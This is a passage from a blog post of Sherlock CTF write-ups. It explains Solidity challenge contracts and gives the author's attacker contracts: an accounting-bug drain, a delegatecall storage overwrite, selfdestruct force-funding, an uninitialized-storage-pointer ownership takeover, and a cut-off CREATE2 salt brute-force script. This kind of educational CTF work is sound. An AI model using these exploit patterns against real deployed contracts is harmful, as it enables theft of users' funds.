<span class="ln">137</span>        <span class="n">collaborations</span><span class="p">[</span><span class="n">user</span><span class="p">].</span><span class="nb">timestamp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln">138</span>        <span class="n">collaborations</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">amount</span> <span class="o">+=</span> <span class="n">incentive</span><span class="p">;</span>
<span class="ln">139</span>        <span class="n">collaborations</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="nb">timestamp</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">;</span>
<span class="ln">140</span>
<span class="ln">141</span>        <span class="c1">// Move the funds
</span><span class="ln">142</span><span class="c1"></span>        <span class="k">payable</span><span class="p">(</span><span class="n">user</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">toReturn</span><span class="p">);</span>
<span class="ln">143</span>        <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">incentive</span><span class="p">);</span>
<span class="ln">144</span>    <span class="p">}</span>
<span class="ln">145</span>
<span class="ln">146</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">147</span>        <span class="nb">revert</span><span class="p">();</span>
<span class="ln">148</span>    <span class="p">}</span>
<span class="ln">149</span>
<span class="ln">150</span>    <span class="n">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
<span class="ln">151</span>        <span class="nb">revert</span><span class="p">();</span>
<span class="ln">152</span>    <span class="p">}</span>
<span class="ln">153</span>
<span class="ln">154</span><span class="p">}</span>
</code></pre></div><p>It was a simple level that implemented a fundraising contract, where anybody could donate ether, given that the donation is higher than a minimum value configured in the deployed instance. To solve the challenge, the attacker had to find a way to drain all ether deposited in the contract.</p>
<p>When creating the level, I didn't want to fall into well-known vulnerabilities such as reentrancy, uninitialized storage pointers, and such. Also, integer overflows would be easy to find, since using Solidity &lt; 0.8 would have been a big eye-opener. External calls are easily detected by VSCode plugins. So I decided to create an internal accounting bug, not easy to see at first sight, that it would force the attacker read and analyze the contract manually.</p>
<p>The first bug is introduced in the <code>fundAs(address)</code> function. This function was meant for the contract to accept donations on behalf of an <code>address</code> different than <code>msg.sender</code>. The sanity check that reverts when the donation is less than the minimum actually checked against <code>msg.sender</code>'s total donated value, instead of checking against <code>address</code>'. This allowed anyone to contribute more than the minimum using <code>fund()</code>, and then call <code>fundAs(address)</code> with a donation below the minimum. The check would pass in that case, and the contract would accept the donation.</p>
<p>Now, the <code>refundInvalid(address)</code> function allows anyone who finds an invalid contribution (that is, less than the minimum value) to get rewarded with 50% of its value. The idea behind this function was to incentivize people to eliminate invalid donations. This had another bug, the <em>main</em> one related to accounting that duplicated the refund. The first refund would go to the internal contribution counter, and the second would be sent as Ether to the calling user.</p>
<p>This had the effect of increasing <code>msg.sender</code>'s donation while at the same time decreasing the contract's balance. Playing with these functions allowed the attacker to make the contributions of <code>msg.sender</code> equal to the contract's balance, allowing them to call <code>repent()</code> and empty the contract.</p>
<p>The exploit I created implemented the steps detailed above to withdraw all ether from the fundraising:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">9</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#39;./Fundraising.sol&#39;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">FundraisingAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Fundraising</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="mi">10000</span> <span class="n">gwei</span><span class="p">);</span>
<span class="ln"> 9</span>        
<span class="ln">10</span>        <span class="n">instance</span><span class="p">.</span><span class="n">fund</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span><span class="mi">1000</span> <span class="n">gwei</span><span class="p">}();</span>
<span class="ln">11</span>        <span class="kt">uint256</span> <span class="n">amount</span><span class="p">;</span>
<span class="ln">12</span>
<span class="ln">13</span>        <span class="p">(</span><span class="n">amount</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">instance</span><span class="p">.</span><span class="n">collaborations</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
<span class="ln">14</span>
<span class="ln">15</span>        <span class="k">while</span><span class="p">(</span><span class="n">amount</span> <span class="o">&lt;</span> <span class="n">instance</span><span class="p">.</span><span class="n">getBalance</span><span class="p">())</span> <span class="p">{</span>
<span class="ln">16</span>            <span class="c1">// Funding as any address will work
</span><span class="ln">17</span><span class="c1"></span>            <span class="n">instance</span><span class="p">.</span><span class="n">fundAs</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span><span class="p">(</span><span class="mi">1000</span> <span class="n">gwei</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">}(</span><span class="mh">0x000000000000000000000000000000000000dEaD</span><span class="p">);</span>
<span class="ln">18</span>            <span class="n">instance</span><span class="p">.</span><span class="n">refundInvalid</span><span class="p">(</span><span class="mh">0x000000000000000000000000000000000000dEaD</span><span class="p">);</span>
<span class="ln">19</span>            <span class="p">(</span><span class="n">amount</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">instance</span><span class="p">.</span><span class="n">collaborations</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
<span class="ln">20</span>        <span class="p">}</span>
<span class="ln">21</span>        <span class="n">instance</span><span class="p">.</span><span class="n">repent</span><span class="p">();</span>
<span class="ln">22</span>    <span class="p">}</span>
<span class="ln">23</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">24</span><span class="p">}</span>
</code></pre></div><hr>
<h2 id="solved-levels">Solved levels</h2>
<hr>
<h3 id="0xmoostorm---collision-exchange">0xmoostorm - Collision Exchange</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/0xmoostorm/CollisionExchange.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/0xmoostorm/Setup.sol">Setup</a></li>
</ul>
<p>This challenge deployed two contracts: <code>CollisionExchange</code> and <code>OrderBook</code>. The former implemented the logic needed to deposit and withdraw Ether, while the latter contained the logic to post trades and emit an event.</p>
<p>The flaw was in the <code>postTrade(uint)</code> function of <code>CollisionExchange</code>, as it called the <code>OrderBook</code> instance via a delegate call. The <code>OrderBook</code> contract would then overwrite slots 0 and 1 from <code>CollisionExchange</code>'s storage, therefore letting anyone become the owner. Once the attacker owns the contract, it can be emptied via the <code>emergencyWithdraw()</code> function.</p>
<p>The exploit was simple, it consisted in nothing more than calling <code>postTrade(uint)</code> and then <code>emergencyWithdraw()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">7</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./CollisionExchange.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">OxmoostormAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">CollisionExchange</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="n">instance</span><span class="p">.</span><span class="n">postTrade</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln"> 9</span>        <span class="n">instance</span><span class="p">.</span><span class="n">emergencyWithdraw</span><span class="p">();</span>
<span class="ln">10</span>    <span class="p">}</span>
<span class="ln">11</span>
<span class="ln">12</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">13</span><span class="p">}</span>
</code></pre></div><h3 id="baraa42---casino">Baraa42 - Casino</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/Baraa42/Casino.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/Baraa42/Setup.sol">Setup</a></li>
</ul>
<p>This one allegedly implemented a Casino-like game. I didn't get to read the contract deeply, because there was an evident fault with the winning logic in <code>Setup.sol</code>.</p>
<p>To solve the level, the condition was to make the <code>Casino</code> instance balance higher than the deposits, plus the prizes, plus the jackpot. However, all those variables started at 0 on deployment, as the contract was not funded by the deployer.</p>
<p>The attack consisted in force-sending Ether to the <code>Casino</code> instance, therefore solving the challenge.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Casino.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">ForceMoney</span> <span class="p">{</span>
<span class="ln"> 6</span>    <span class="kt">address</span> <span class="n">target</span><span class="p">;</span>
<span class="ln"> 7</span>
<span class="ln"> 8</span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">t</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 9</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln">10</span>        <span class="n">target</span> <span class="o">=</span> <span class="n">t</span><span class="p">;</span>
<span class="ln">11</span>    <span class="p">}</span>
<span class="ln">12</span>
<span class="ln">13</span>    <span class="kd">function</span> <span class="nf">die</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln">14</span>        <span class="nb">selfdestruct</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">target</span><span class="p">));</span>
<span class="ln">15</span>    <span class="p">}</span>
<span class="ln">16</span><span class="p">}</span>
<span class="ln">17</span>
<span class="ln">18</span><span class="kd">contract</span> <span class="nc">Baraa42Attacker</span> <span class="p">{</span>
<span class="ln">19</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Casino</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">20</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln">21</span>        <span class="n">ForceMoney</span> <span class="n">f</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ForceMoney</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">));</span>
<span class="ln">22</span>        <span class="n">f</span><span class="p">.</span><span class="n">die</span><span class="p">();</span>
<span class="ln">23</span>    <span class="p">}</span>
<span class="ln">24</span>
<span class="ln">25</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">26</span><span class="p">}</span>
</code></pre></div><h3 id="bowtiedpickle---padlock">BowTiedPickle - Padlock</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/BowTiedPickle/Padlock.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/BowTiedPickle/Setup.sol">Setup</a></li>
</ul>
<p>This padlock implementation had 3 tumblers, implemented as independent functions, that were to be &quot;solved&quot; in sequence.</p>
<ul>
<li>The first one required providing the correct password</li>
<li>The second one required a <code>msg.value</code> equal to 33</li>
<li>The third and last one required that the argument was equal to a constant</li>
</ul>
<p>At first sight it looked like a simple challenge. After all, the password was hidden in plain sight in <a href="https://github.com/tqtsar/sherlockctf-solutions/blob/0821615550c3dfa83270ebd08613592b5b429cf1/Solved/BowTiedPickle/Setup.sol#L10">line 10 of <code>Setup.sol</code></a>... was it?</p>
<p>If you see the code on GitHub or any IDE such as VSCode, they will show special unicode characters that are not visible, called Right-to-Left Override and Left-to-Right Override. These special characters and make the writing right-to-left or left-to-right, respectively. So, the password seen in the text file is actually reversed.</p>
<p>Other than that, the attack consisted in calling the pick functions in sequence to unlock the padlock. Note that in my solution, the RTLO and LTRO characters are still present, as I copied the value directly from the <code>Setup</code> contract.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Padlock.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">BowTiedPickleAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Padlock</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">33</span> <span class="kc">wei</span><span class="p">);</span>
<span class="ln"> 9</span>
<span class="ln">10</span>        <span class="n">instance</span><span class="p">.</span><span class="n">pick1</span><span class="p">(</span><span class="n">unicode</span><span class="s">&#34;‮6167209‬&#34;</span><span class="p">);</span>
<span class="ln">11</span>        <span class="n">instance</span><span class="p">.</span><span class="n">pick2</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">33</span> <span class="kc">wei</span><span class="p">}();</span>
<span class="ln">12</span>        <span class="n">instance</span><span class="p">.</span><span class="n">pick3</span><span class="p">(</span><span class="mh">0x69420000000000000000000000000000</span><span class="p">);</span>
<span class="ln">13</span>
<span class="ln">14</span>        <span class="n">instance</span><span class="p">.</span><span class="n">open</span><span class="p">();</span>
<span class="ln">15</span>
<span class="ln">16</span>    <span class="p">}</span>
<span class="ln">17</span>
<span class="ln">18</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">19</span><span class="p">}</span>
</code></pre></div><h3 id="justdravee---sheerlocking">JustDravee - SheerLocking</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/JustDravee/SheerLocking.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/JustDravee/Setup.sol">Setup</a></li>
</ul>
<p>An interesting, Sherlock Holmes themed contract with the only objective of playing tricks with your mind. There was no vulnerability, but instead, the whole contract was designed to force the attacker to actually read the code and see what the functions were expecting.</p>
<p>There were 7 <code>unSheerLock</code> functions that were to be called in sequence with arguments that met the conditions for each one. However, I still think Johnny Lee Miller was the best personification of Sherlock.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./SheerLocking.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">JustDraveeAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>
<span class="ln"> 7</span>    <span class="kt">bytes8</span> <span class="k">constant</span> <span class="n">key</span> <span class="o">=</span> <span class="mh">0x0100000000000102</span><span class="p">;</span>
<span class="ln"> 8</span>    
<span class="ln"> 9</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">SheerLocking</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">10</span>        
<span class="ln">11</span>        <span class="n">instance</span><span class="p">.</span><span class="n">unSheerLock1</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">24725</span> <span class="kc">wei</span><span class="p">}(</span><span class="s">&#34;Bene&#34;</span><span class="p">,</span> <span class="s">&#34;dict Cumber&#34;</span><span class="p">,</span> <span class="s">&#34;batch is t&#34;</span><span class="p">,</span> <span class="s">&#34;he b&#34;</span><span class="p">,</span> <span class="s">&#34;est&#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
<span class="ln">12</span>        <span class="n">instance</span><span class="p">.</span><span class="n">unSheerLock2</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;ice too. I waited so long for  season 4 :&#39;( &#34;</span><span class="p">,</span> <span class="s">&#34;Jim Moriarty is n&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
<span class="ln">13</span>        <span class="n">instance</span><span class="p">.</span><span class="n">unSheerLock3</span><span class="p">(</span><span class="s">&#34;The Woman&#34;</span><span class="p">,</span> <span class="s">&#34; is Missy&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="s">&#34;The Master in Doctor Who&#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
<span class="ln">14</span>        <span class="n">instance</span><span class="p">.</span><span class="n">unSheerLock4</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;John Watson had a role in Ali G (Ricky C) &#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span>  <span class="n">key</span><span class="p">);</span>
<span class="ln">15</span>        <span class="n">instance</span><span class="p">.</span><span class="n">unSheerLock5</span><span class="p">(</span><span class="s">&#34;Henry Cavil&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;l: Sherlock of Ste&#34;</span><span class="p">,</span> <span class="s">&#34;el and Enola&#39;s big bro&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
<span class="ln">16</span>        <span class="n">instance</span><span class="p">.</span><span class="n">unSheerLock6</span><span class="p">(</span><span class="s">&#34;Sir Arthur Conan Doy&#34;</span><span class="p">,</span> <span class="s">&#34;le died in 1930, so copyright on Sher&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;lock Holmes expired in 2000 in the UK&#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
<span class="ln">17</span>        <span class="n">instance</span><span class="p">.</span><span class="n">unSheerLock7</span><span class="p">(</span><span class="s">&#34;Jonny Lee M&#34;</span><span class="p">,</span> <span class="s">&#34;iller and Lu&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;cy Liu were a g&#34;</span><span class="p">,</span> <span class="s">&#34;ood team too!&#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
<span class="ln">18</span>
<span class="ln">19</span>    <span class="p">}</span>
<span class="ln">20</span>
<span class="ln">21</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">22</span>
<span class="ln">23</span><span class="p">}</span>
</code></pre></div><h3 id="peterisprieditis---stableswap2">PeterisPrieditis - StableSwap2</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/PeterisPrieditis/StableSwap2.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/PeterisPrieditis/Setup.sol">Setup</a></li>
</ul>
<p>This contract implemented a DEx with the capability of swapping stablecoins, deployed to work with a mocked version of USDC, USDT, and BUSD. The owner of the <code>StableSwap2</code> is allowed to add more coins to be used, every token is considered to be equally valued at exactly 1 USD, and there's a fixed fee of 0.3% for each swap between coins. The initial balance of the contract is 10000 for each coin, and there's a free-to-use faucet for a limit of 1000 units of USDC.</p>
<p>There's another flaw in <code>Setup.sol</code>, as the <code>totalValue</code> variable in the <code>isSolved()</code> function is overwritten twice, so the real value for the comparison is just the amount of BUSD in the <code>StableSwap2</code> instance.</p>
<p>The vulnerability lied in the <code>donate(uint256)</code> function, as it uses an uninitialized storage pointer. This allows the attacker to overwrite the <code>owner</code> variable (inherited from <code>Ownable</code> and thus not seen in the contract). Once the attacker becomes the new owner, adding a new token to the swap and extracting the BUSD from the instance will solve the challenge.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">PeterisPrieditisAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Setup</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="n">ERC20</span> <span class="n">USDC</span> <span class="o">=</span> <span class="n">instance</span><span class="p">.</span><span class="n">USDC</span><span class="p">();</span>
<span class="ln"> 9</span>        <span class="n">ERC20</span> <span class="n">BUSD</span> <span class="o">=</span> <span class="n">instance</span><span class="p">.</span><span class="n">BUSD</span><span class="p">();</span>
<span class="ln">10</span>        <span class="n">StableSwap2</span> <span class="n">SSwap</span> <span class="o">=</span> <span class="n">StableSwap2</span><span class="p">(</span><span class="n">instance</span><span class="p">.</span><span class="n">instance</span><span class="p">());</span>
<span class="ln">11</span>        <span class="n">ERC20PresetFixedSupply</span> <span class="n">solverToken</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ERC20PresetFixedSupply</span><span class="p">(</span><span class="s">&#34;SolverToken Stablecoin&#34;</span><span class="p">,</span><span class="s">&#34;STKS&#34;</span><span class="p">,</span><span class="mi">100000</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
<span class="ln">12</span>        <span class="n">solverToken</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">SSwap</span><span class="p">),</span> <span class="mi">10000</span><span class="p">);</span>
<span class="ln">13</span>
<span class="ln">14</span>        <span class="n">instance</span><span class="p">.</span><span class="n">faucet</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
<span class="ln">15</span>        <span class="n">USDC</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">SSwap</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
<span class="ln">16</span>
<span class="ln">17</span>        <span class="kt">uint256</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">amounts</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">uint256</span><span class="p">[](</span><span class="mi">3</span><span class="p">);</span>
<span class="ln">18</span>        <span class="n">amounts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span>
<span class="ln">19</span>        <span class="n">amounts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln">20</span>        <span class="n">amounts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln">21</span>
<span class="ln">22</span>        <span class="n">SSwap</span><span class="p">.</span><span class="n">mint</span><span class="p">(</span><span class="n">amounts</span><span class="p">);</span>
<span class="ln">23</span>        <span class="n">SSwap</span><span class="p">.</span><span class="n">donate</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// Owned
</span><span class="ln">24</span><span class="c1"></span>
<span class="ln">25</span>        <span class="n">SSwap</span><span class="p">.</span><span class="n">addCollateral</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">solverToken</span><span class="p">));</span>
<span class="ln">26</span>        <span class="n">solverToken</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">SSwap</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
<span class="ln">27</span>        <span class="n">SSwap</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">solverToken</span><span class="p">),</span> <span class="mi">9995</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">BUSD</span><span class="p">));</span>
<span class="ln">28</span>    <span class="p">}</span>   
<span class="ln">29</span><span class="p">}</span>
</code></pre></div><h3 id="thro77le---challenge">Thro77le - Challenge</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/Thro77le/Challenge.sol">Contract</a> / <a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/Thro77le/Factory.sol">Factory</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/Thro77le/Setup.sol">Setup</a></li>
</ul>
<p>This challenge had no vulnerability, but instead was meant to make the attacker study how contract deployment works. It reminded me of CaptureTheEther's <a href="../capturetheether-4/#fuzzy-identity">Fuzzy Identity</a>, so the solution is similar.</p>
<p>The contract required the attacker to deploy a contract to an address that contained the <code>f0b1d</code> hex string somewhere, and that this address was funded at the moment of deployment. This means that the requirement was to pre-calculate a deployment address that met the requirements, and then fund it prior to deploying any contract to it.</p>
<p>I used the following Python script to bruteforce the seed needed to comply with the deployment address' restrictions. The address was hardcoded as I already knew the account I was going to use for deployment, and I got the bytecode for the contract to be deployed (an empty contract) from Remix.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ln"> 1</span><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="n">deployingAddr</span> <span class="o">=</span> <span class="s2">&#34;FD4f30C20dA65a37fd74d55B257442a08469e6A6&#34;</span>
<span class="ln"> 4</span><span class="n">addrbytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">deployingAddr</span><span class="p">)</span>
<span class="ln"> 5</span><span class="n">bytecode</span> <span class="o">=</span> <span class="s2">&#34;6080604052348015600f57600080fd5b50603f80601d6000396000f3fe6080604052600080fdfea264697066735822122051263de48b020bfd029cc7b233b6549029f593de824f0aec76af62fef252447264736f6c63430008040033&#34;</span>
<span class="ln"> 6</span>           
<span class="ln"> 7</span><span class="n">hashbytecode</span> <span class="o">=</span> <span class="n">Web3</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span><span class="n">hexstr</span><span class="o">=</span><span class="n">bytecode</span><span class="p">)</span>
<span class="ln"> 8</span><span class="n">salt</span> <span class="o">=</span> <span class="mi">1</span>
<span class="ln"> 9</span>
<span class="ln">10</span><span class="n">header</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;ff&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">addrbytes</span>
<span class="ln">11</span>
<span class="ln">12</span><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
<span class="ln">13</span>    <span class="n">salthex</span> <span class="o">=</span> <span class="n">Web3</span><span class="o">.</span><span class="n">toHex</span><span class="p">(</span><span class="n">salt</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
<span class="ln">14</span>    <span class="n">saltbytes</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">salthex</span><span class="p">))</span> <span class="o">+</span> <span class="n">salthex</span>
<span class="ln">15</span>
